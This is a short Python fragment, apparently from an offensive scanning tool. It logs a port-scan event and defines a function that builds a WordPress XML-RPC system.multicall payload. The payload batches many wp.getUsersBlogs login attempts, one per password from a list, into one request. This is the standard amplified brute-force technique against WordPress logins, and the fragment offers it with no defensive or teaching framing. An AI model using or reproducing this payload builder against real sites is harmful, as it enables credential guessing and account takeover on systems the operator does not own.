from core.logger import log_event

log_event("scan", {"target": "example.com", "status": "open ports found"}, level="info", write_structured_file=True)

def build_multicall_payload(username, passwords):
    calls = [{
        "methodName": "wp.getUsersBlogs",
        "params": [username, pwd]
    } for pwd in passwords]

    return {
        "methodCall": {
            "methodName": "system.multicall",
            "params": [calls]
        }
    }
